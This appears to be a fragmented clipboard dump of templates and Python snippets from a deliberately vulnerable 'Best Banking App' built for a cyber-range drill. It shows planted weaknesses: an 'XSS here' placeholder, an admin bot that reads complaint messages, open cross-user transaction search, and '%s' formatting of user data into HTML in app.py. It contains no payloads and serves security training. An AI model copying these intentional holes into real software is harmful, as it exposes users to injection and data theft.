c5d1e3b904712aebcb599a2f08ea0f41|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|2|1|V|html
		<body>        						<!-- the header -->
	        <header>
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="index.html">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p>           
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	               	</ul>
	            </nav>
	        
	        </header>
	        							<!-- the spacer -->
9ecc051b03963db12706d3d2deea8fbd|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|2|1|V|html
			<section id="spacer">        	         
	            
				<div class="spacer-wrapper">				
					
90f6db3e4c1a2949e4f736509d776ce1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|12|8|V|html
				</div>
			</section>
f9966849bb3b5c7d11603175627f2d3a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/layout.html|89|1|V|html
	                {% block spacer %}
	                {% end block %}
7b85256e12b84cd323e159eaff31cc05|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|16|1|V|html
	        							<!-- three columns -->
			<section id="three-columns">
	
				<div class="three-columns-wrapper">
	        	
	           		<article>            	               
	               		<img src="/images/lightning.png" height="100px" width="100px" />                
	               		<h3>Fast</h3>
	                	
	               		<p>Enjoy the fastest banking experience!</p>
	           		</article>
	            	
	           		<article>            	     
	               		<img src="/images/bug.png" height="100px" width="100px" />
	                	
	               		<h3>Reliable</h3>
	                	
	               		<p>Our web application is bug free and never breaks!</p>
	           		</article>
	            
	           		<article>            	    
	               		<img src="/images/lock.png" height="100px" width="100px" />                
	                		<h3>Secure</h3>
	                
	                		<p>The best security experts make sure that your banking data is safe!</p>
	                </article>
					
				</div><!-- end three columns-wrapper -->
	           	<br class="clear"/>
	        
	        </section>        
	        <section id="obts">        	
	            
	            <div class="obts-wrapper">
	            		
	            	<article>           	 
	               		<h3>No anonymity!</h3>
	                
	               		<p>We are proudly the first bank to offer zero anonymity! Any user can search for all the transactions of another user!</p>                		
	            	</article>            
	            	
					<section id="ts">               
	            
	               		<article class="row">                   
	            
	                    		<img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                    
	                            <p>Have a complaint?<br><br> Contact us <a href='/contact_us'>here</a> to suggest how your banking experience can be improved!</p> </article> 
	                
	               		<article class="row">                   
	            
	                   		<img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                    
	                        <p>Our admin check out your complaint in no time and make sure it is resolved!<br><br></p>
	                	</article> 
	            	
	            	</section>
				
				</div>			<!-- end obts-wrapper -->
				
fac3e746ce2b33be2f449f6e9609bf41|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|76|1|V|html
				<br class="clear"/>        
	        <footer class="footer-distributed">
	
	        	<div class="footer-wrapper">        	
	
					<p class="footer-links">
					
						<a href="/">Home</a>
						¬∑
						<a href="/profile">Profile</a>
						¬∑
						<a href="/contact_us">Contact US</a>
						¬∑					
	
					</p>
	
					<p>Best Banking App; 2020</p>
						
					<div class="footer-right">
							<!-- the social media icons from Bootstrap CDN: -->
						<a href="#"><i class="fa fa-facebook"></i></a>
						<a href="#"><i class="fa fa-twitter"></i></a>
						<a href="#"><i class="fa fa-linkedin"></i></a>
						<a href="#"><i class="fa fa-github"></i></a>
	
					</div>
				
				</div><!-- end footer-wrapper -->
	
			</footer>
	                
		</body>
	</html>
e86c08252d491735083aaca75d993017|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|54|1|V|html
	                <br>
6c8aa9d5d686dfc858750e21838d4541|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|4|1|V|html
	            <!-- after clicking/tapping the search button, the site remains on the search 
	            result link while refreshing 
	            ( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
	            So we have to return to index.html explicitly for further testing. I added a link 
	            to itself (index.html) on the logo, see the header -->
ef4b64f871b156e218165dc0a033082e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|1|1|V|html
	{% extends "layout.html" %}
	    {% block spacer %}
	        <form action="#">
	            <input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
	            <input type="submit" name="start_search" class="button" value="Search"/>
	        </form>				
	    {% endblock %}
	
	    {% block content %}
302bf78ecee0f9e18d00ceb1347e8dd8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|10|1|V|html
	<!-- The JoccaGit HTML5 Template -->
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="css/styles.css" type="text/css" media="screen" />
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media="screen" />
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="\/js\/vendor\/1.7.2.jquery.min.js"><\/script>')</script>
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
		<body>        						<!-- the header -->
	        <header>
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="index.html">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p>           
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact">Contact Us</a></li>
	               	</ul>
	            </nav>
	        
	        </header>
	        							<!-- the spacer -->
			<section id="spacer">        	         
	            
				<div class="spacer-wrapper">				
					
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
				
				</div>
			</section>
	        <br class="clear"/>        
	        </section>		
	        <p>Contact</p>
	        <footer class="footer-distributed">
	
	        	<div class="footer-wrapper">        	
	
					<p class="footer-links">
					
						<a href="/">Home</a>
						¬∑
						<a href="/profile">Profile</a>
						¬∑
						<a href="/contact">Contact Us</a>
						¬∑					
	
					</p>
	
					<p>Best Banking App; 2020</p>
						
					<div class="footer-right">
							<!-- the social media icons from Bootstrap CDN: -->
						<a href="#"><i class="fa fa-facebook"></i></a>
						<a href="#"><i class="fa fa-twitter"></i></a>
						<a href="#"><i class="fa fa-linkedin"></i></a>
						<a href="#"><i class="fa fa-github"></i></a>
	
					</div>
				
				</div><!-- end footer-wrapper -->
	
			</footer>
	                
		</body>
	</html>
02d2852788b47c4c6efa5a93812298f7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|1|1|V|html
	{% extends "layout.html" %}
40514e75850fd062ca170dd539fa2253|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|2|1|V|html
	<!-- The JoccaGit HTML5 Template -->
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="css/styles.css" type="text/css" media="screen" />
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media="screen" />
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="\/js\/vendor\/1.7.2.jquery.min.js"><\/script>')</script>
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
		<body>        						<!-- the header -->
	        <header>
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="index.html">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p>           
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact US</a></li>
	               	</ul>
	            </nav>
	        
	        </header>
	
			<section id="spacer">        	         
				<div class="spacer-wrapper">				
				</div>
			</section>
f6a839bebcc1df0b19d77fac6d3d09c8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|57|1|V|html
	        <footer class="footer-distributed">
	
	        	<div class="footer-wrapper">        	
	
					<p class="footer-links">
					
						<a href="/">Home</a>
						¬∑
						<a href="/profile">Profile</a>
						¬∑
						<a href="/contact_us">Contact Us</a>
						¬∑					
	
					</p>
	
					<p>Best Banking App; 2020</p>
						
					<div class="footer-right">
							<!-- the social media icons from Bootstrap CDN: -->
						<a href="#"><i class="fa fa-facebook"></i></a>
						<a href="#"><i class="fa fa-twitter"></i></a>
						<a href="#"><i class="fa fa-linkedin"></i></a>
						<a href="#"><i class="fa fa-github"></i></a>
	
					</div>
				
				</div><!-- end footer-wrapper -->
	
			</footer>
	                
		</body>
	</html>
a0a0debd7453c21b25ccb0e577d1c658|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|10|1|V|html
	<!-- The JoccaGit HTML5 Template -->
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="css/styles.css" type="text/css" media="screen" />
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media="screen" />
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="\/js\/vendor\/1.7.2.jquery.min.js"><\/script>')</script>
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
		<body>        						<!-- the header -->
	        <header>
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="index.html">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p>           
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	               	</ul>
	            </nav>
	        
	        </header>
	        							<!-- the spacer -->
			<section id="spacer">        	         
	            
				<div class="spacer-wrapper">				
					
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
				
				</div>
			</section>
	        <br class="clear"/>        
3d838894c0177c8e58791f4b0e758f16|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|10|1|V|html
	<!-- The JoccaGit HTML5 Template -->
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="css/styles.css" type="text/css" media="screen" />
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media="screen" />
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="\/js\/vendor\/1.7.2.jquery.min.js"><\/script>')</script>
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
		<body>        						<!-- the header -->
	        <header>
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="index.html">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p>           
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	               	</ul>
	            </nav>
	        
	        </header>
f32543742a0273ad23394985df10d61d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|10|1|V|html
	        							<!-- the spacer -->
			<section id="spacer">        	         
	            
				<div class="spacer-wrapper">				
					
					<form action="#">
						<!-- after clicking/tapping the search button, the site remains on the search 
						result link while refreshing 
						( index.html?sitesearch=Enter+a+word...&start_search=Search# ). 
						So we have to return to index.html explicitly for further testing. I added a link 
						to itself (index.html) on the logo, see the header -->
						<input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
						<input type="submit" name="start_search" class="button" value="Search"/>
					</form>				
				
				</div>
			</section>
	        <br class="clear"/>        
676c8751112dd77ebd364368a4d710ff|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|52|5|V|python
	        return redirect(url_for('index'))
cab30deb05fba73f0702c85eff84740b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/bot/xssbot.js|3|1|V|javascript
	var resource = '/admin'
2288a57015dbbe02662930a89517a9cb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|11|1|V|htmldjango
	    <section id="three-columns">
	
	        <div class="three-columns-wrapper">
	        
	            <article>            	               
	                <img src="/images/lightning.png" height="100px" width="100px" />                
	                <h3>Fast</h3>
	                
	                <p>Enjoy the fastest banking experience!</p>
	            </article>
	            
	            <article>            	     
	                <img src="/images/bug.png" height="100px" width="100px" />
	                
	                <h3>Reliable</h3>
	                
	                <p>Our web application is bug free and never breaks!</p>
	            </article>
	        
	            <article>            	    
	                <img src="/images/lock.png" height="100px" width="100px" />                
	                    <h3>Secure</h3>
	            
	                    <p>The best security experts make sure that your banking data is safe!</p>
	            </article>
	            
	        </div><!-- end three columns-wrapper -->
	        <br class="clear"/>
c3c0ee027fae9fb032f5a37f2781f924|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|39|5|V|htmldjango
	    <p>Profile here</p>
81500bf1e414028d5aa73cd72af4d687|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|76|1|V|python
	        <div class="col-md-6 col-sm-6">
	          <div class="panel panel-primary" style="margin-top:50px;">
	            <div class="panel-heading">
	              <h3 class="panel-title">User Info</h3>
	            </div>
	            <div class="panel-body">
	              <fieldset>
	                <div class="form-group">
	                  <label for="username">Username</label>
	                  <input type="text" id="username" name="username" value="{{ username }}" class="form-control" disabled>
	                </div>
	                <div class="form-group">
	                  <label for="email">Current Email</label>
	                  <input type="text" id="currentEmail" name="currentEmail" value="%s" class="form-control" disabled>
	                </div>
	              </fieldset>
	            </div>
	          </div>
	        </div>
a1366dba7cff79dabb31209849f8bc50|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|17|17|V|htmldjango
	                <h3>Fast</h3>
c3d64b90d143a10321372ee09c6d5ec7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|18|16|V|htmldjango
	                <p>Enjoy the fastest banking experience!</p>
08238953fe0f6dd13f10714ebfbcb9f9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|16|35|v|htmldjango
	lightning
deec03835160f2e34b3c3ba40a050a72|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|87|1|V|python
	                <div class="form-group">
	                  <label for="email">Current Email</label>
	                  <input type="text" id="currentEmail" name="currentEmail" value="%s" class="form-control" disabled>
	                </div>
25f23ecaaddc44e19206f1d7539c73bb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|76|1|V|python
	        <div class="col-md-6 col-sm-6">
	          <div class="panel panel-primary" style="margin-top:50px;">
	            <div class="panel-heading">
	              <h3 class="panel-title">User Info</h3>
	            </div>
	            <div class="panel-body">
	              <fieldset>
	                <div class="form-group">
	                  <label for="username">Username</label>
	                  <input type="text" id="username" name="username" value="{{ username }}" class="form-control" disabled>
	                </div>
	              </fieldset>
	            </div>
	          </div>
	        </div>
41c0d8abe506be594de107e0ec251664|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|100|9|V|python
	                <div class="form-group">
	                  <label for="username">Username</label>
	                  <input type="text" id="username" name="username" value="{{ username }}" class="form-control" disabled>
	                </div>
79e1ab01d701ca894d449b7058572399|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|111|9|V|python
	        # return render_template('profile.html')
260eab3076e2e8af3d154229d599a68c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|24|1|V|htmldjango
	                <h3>Reliable</h3>
84fcf5d37086f2a93953734ce8f385b6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|17|21|v|htmldjango
	Reliable
0c83f57c786a0b4a39efab23731c7ebc|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|25|20|v|htmldjango
	email
06d637c9dd65af76d810108e7a300e62|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|26|17|V|htmldjango
	                <h3>Email</h3>
7d478185605f246010ee71cdfc01739d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|27|17|V|htmldjango
	                <p>Our web application is bug free and never breaks!</p>
1e3fd78caf8db0464aa9b0522fbc8a18|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|31|21|V|htmldjango
	                    <h3>Secure</h3>
45a6e71b60cab10f3c9adc3981a1a871|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|31|24|v|htmldjango
	The best security experts make sure that your banking data is safe!
5b0e847d8dcc67d11c765be3a1ad2f3a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|17|17|V|htmldjango
	                <h3>Username</h3>
94a35f894bd00af8bc5931f8d3986963|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|78|1|V|python
	            <div class="panel-heading">
	              <h3 class="panel-title">User Info</h3>
	            </div>
cd12735f651bec8c8f586fd6d4b89294|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/templates/profile.html|85|1|V|html
		<div class="col-md-4">
	          <div class="panel panel-primary" style="margin-top:00px">
	            <div class="panel-heading">
	              <h3 class="panel-title">Contact Us</h3>
	            </div>
	            <div class="panel-body">
	              <form action="/contact" method="POST">
	                <fieldset>
	                  <div class="form-group">
	                    <label for="changeName">Contact Message</label>
	                    <input type="text" id="contactMessage" name="contactMessage" class="form-control">
	                  </div>
	                  <div class="form-actions">
	                    <input type="submit" value="Contact" class="btn btn-primary">
	                  </div>
	                </fieldset>
	              </form>
	            </div>
	          </div>
2ff37abd7ee43dcffa7f785e7c88a8fe|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|29|5|V|htmldjango
	    <p>XSS here</p>
2ca78782072d74d1a235a1ca037ce6c1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|143|9|V|python
	        render_template('contact.html')
5b4658f297f9a14c4d5c3c58bc7cdfd8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|134|1|V|python
	        return render_template('contact.html')
2f8a6bf31f3bd67bd2d9720c58b19c9a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|148|29|v|python
	contact
b4ef2b833adcdf08970e31569129a3d0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|149|5|V|python
	    return "<html><body><div><h2>Admin Notified !!!</h2><br>Please click <a href='/profile'>here</a> to return to your profile.</div></body></html>"
794ec87c59076d43718f96e76772b001|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|3|1|V|htmldjango
	        <form action="#">
	            <input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
	            <input type="submit" name="start_search" class="button" value="Search"/>
	        </form>				
9a6e0f427a5a3a0e09a3f3489d08f545|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|3|1|V|htmldjango
	        {% include "search_bar.html" %}
23407e95850cf57553643dba98c8c848|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|62|1|V|htmldjango
	                        <img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
d10ab858675a72c844fefae1b5940b7e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/notified.html|9|1|V|htmldjango
	
	    <section id="three-columns">
	
	        <div class="three-columns-wrapper">
	        
	            <article>            	               
	                <img src="/images/user.jpg" height="100px" width="100px" />                
	                {% block user %}
	                {% endblock %}
	            </article>
	            
	            <article>            	     
	                <img src="/images/mail.png" height="100px" width="100px" />
	                {% block email %}
	                {% endblock %} 
	            </article>
	        
	            <article>            	    
	                <img src="/images/lock.png" height="100px" width="100px" />                
	                <p>Your personal details are safe!</p>
	            </article>
	            
	        </div><!-- end three columns-wrapper -->
94ab1bf1cd6bb90d10d92742e6846bb1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|64|1|V|htmldjango
	                        <p>Have a complaint?<br><br> Contact us <a href='/contact_us'>here</a> to suggest how your banking experience can be improved!</p> </article> 
fabe9db5ceeb24f977579ebdcfb0630b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/notified.html|9|5|V|htmldjango
	    <p>Have a complaint?<br><br> Contact us <a href='/contact_us'>here</a> to suggest how your banking experience can be improved!</p> </article> 
3a9da8672cb2f41790daf1f7ea19f042|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/templates/profile.html|26|1|V|html
				<a href="/logout"><span class="glyphicon glyphicon-log-out"></span> Logout</a>
